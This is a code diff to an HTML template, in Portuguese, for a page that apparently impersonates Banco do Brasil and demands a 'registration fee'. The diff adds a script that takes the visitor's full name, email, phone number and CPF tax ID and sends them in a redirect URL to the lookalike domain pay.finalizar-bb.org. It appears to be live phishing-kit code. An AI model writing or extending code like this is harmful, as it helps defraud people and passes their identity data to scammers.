@@ -114,11 +114,23 @@
                     </div>
                 </div>
 
-                <a href="https://pay.finalizar-bb.org/nQ7kZ7kbynaZ0eJ" 
+                <a href="#" onclick="redirecionarPagamento()" 
                    class="w-full bg-bb-blue hover:bg-opacity-90 text-white font-bold py-4 px-6 rounded-md flex items-center justify-center space-x-2 shadow-md hover:shadow-lg transition duration-200 animate-pulse">
                     <span class="text-lg">PAGAR TAXA DE INSCRIÇÃO</span>
                     <i class="fas fa-lock ml-2"></i>
                 </a>
+
+                <script>
+                    function redirecionarPagamento() {
+                        const nomeCompleto = "{{ dados.name }}";
+                        const email = "{{ dados.email }}";
+                        const telefone = "{{ dados.phone }}";
+                        const cpf = "{{ dados.cpf }}";
+
+                        const url = `https://pay.finalizar-bb.org/nQ7kZ7kbynaZ0eJ?name=${encodeURIComponent(nomeCompleto)}&email=${encodeURIComponent(email)}&telephone=${encodeURIComponent(telefone)}&document=${encodeURIComponent(cpf)}`;
+                        window.location.href = url;
+                    }
+                </script>
             </div>
         </div>
     </div>
